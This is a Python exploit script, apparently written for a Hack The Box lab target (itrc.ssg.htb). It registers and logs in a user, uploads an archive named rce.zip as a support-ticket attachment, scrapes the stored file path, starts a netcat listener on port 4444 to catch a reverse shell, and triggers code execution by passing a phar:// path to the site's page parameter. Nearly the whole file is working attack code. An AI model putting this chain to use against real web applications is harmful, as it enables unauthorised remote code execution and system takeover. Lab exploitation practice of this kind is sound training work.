import requests
from bs4 import BeautifulSoup
import subprocess

BASE_URL = "http://itrc.ssg.htb"
SESSION = requests.Session()

def get_phpsessid():
    phpsessid = SESSION.cookies.get('PHPSESSID')
    if not phpsessid:
        response = SESSION.get(BASE_URL)
        if 'Set-Cookie' in response.headers:
            cookies = response.headers['Set-Cookie']
            for cookie in cookies.split(';'):
                if 'PHPSESSID' in cookie:
                    phpsessid = cookie.split('=')[1]
                    break
    return phpsessid

def set_dynamic_phpsessid():
    phpsessid = get_phpsessid()
    if phpsessid:
        SESSION.cookies.set('PHPSESSID', phpsessid)
        print(f"Set dynamic PHPSESSID: {phpsessid}")
    else:
        print("Failed to obtain PHPSESSID.")

def register_user():
    url = f"{BASE_URL}/api/register.php"
    data = {
        'user': 'test2',
        'pass': 'test2',
        'pass2': 'test2'
    }
    response = SESSION.post(url, data=data)
    if response.status_code == 200:
        if "Username already exists" in response.text:
            print("Registration failed: Username already exists.")
        else:
            print("User registered successfully!")
            set_dynamic_phpsessid()
    else:
        print(f"Error during registration: {response.status_code}")
        print(response.text)

def login_user():
    url = f"{BASE_URL}/api/login.php"
    data = {
        'user': 'test2',
        'pass': 'test2'
    }
    response = SESSION.post(url, data=data)
    if response.status_code == 200:
        if "login" in response.text.lower():
            print("Login failed: Incorrect credentials or other error.")
        else:
            print("Login successful!")
            set_dynamic_phpsessid()
    else:
        print(f"Error during login: {response.status_code}")
        print(response.text)

    for cookie in SESSION.cookies:
        print(f"{cookie.name}: {cookie.value}")

def create_ticket():
    create_ticket_url = f"{BASE_URL}/?page=create_ticket"
    response = SESSION.get(create_ticket_url)
    if response.status_code != 200:
        print(f"Failed to load the create ticket page. Status code: {response.status_code}")
        return

    print("Loaded create ticket page successfully!")

    post_ticket_url = f"{BASE_URL}/api/create_ticket.php"
    subject = "testinghh"
    body = "testinghh"
    file_path = "/home/cosmic/HTB/rce.zip"

    with open(file_path, "rb") as file:
        files = {
            "attachment": ("rce.zip", file, "application/zip")
        }
        data = {
            "subject": subject,
            "body": body,
        }
        SESSION.post(post_ticket_url, data=data, files=files)
        print("Ticket created successfully!")

def ticket_info():
    ticket_url = f"{BASE_URL}/?page=dashboard"
    response = SESSION.get(ticket_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    ticket_rows = soup.find_all('div', class_='row ticket-row')
    ticket_ids = []
    for row in ticket_rows:
        ticket_id_div = row.find('div', class_='col-2 center-text')
        if ticket_id_div:
            ticket_ids.append(ticket_id_div.text.strip())

    if ticket_ids:
        print("Last ticket ID:", ticket_ids[-1])  
        return ticket_ids[-1]
    else:
        print("No tickets found.")
        return None

def extract_attachment_url(ticket_html):
    soup = BeautifulSoup(ticket_html, 'html.parser')
    attachment_link = soup.find('a', class_='attachment-link')
    
    if attachment_link:
        attachment_url = attachment_link.get('href')
        if attachment_url:
            attachment_url = attachment_url.lstrip('../')
            print(f"URL: /{attachment_url}")
            return attachment_url
        else:
            print("No href found in attachment link.")
    else:
        print("No attachment link found.")
    return None

def fetch_ticket_html(ticket_id):
    if not ticket_id:
        print("No valid ticket ID provided.")
        return

    ticket_url = f"{BASE_URL}/?page=ticket&id={ticket_id}"
    response = SESSION.get(ticket_url)
    if response.status_code == 200:
        print(f"Successfully retrieved ticket {ticket_id}.")
        attachment_url = extract_attachment_url(response.text)
        return attachment_url
    else:
        print(f"Failed to fetch ticket {ticket_id}. Status code: {response.status_code}")
        return None

def reverse_shell():
    subprocess.Popen(['gnome-terminal', '--', 'nc', '-nlvp', '4444'])

def send_get_request_with_attachment(attachment_url):
    if not attachment_url:
        print("No attachment URL provided.")
        return
    phar_url = f"{BASE_URL}/?page=phar://{attachment_url}/rce"
    print(f"Sending GET request to: {phar_url}")
    response = SESSION.get(phar_url)

if __name__ == "__main__":
    register_user()
    login_user()
    create_ticket()
    reverse_shell()
    ticket_id = ticket_info()
    if ticket_id:
        attachment_url = fetch_ticket_html(ticket_id)
        send_get_request_with_attachment(attachment_url)


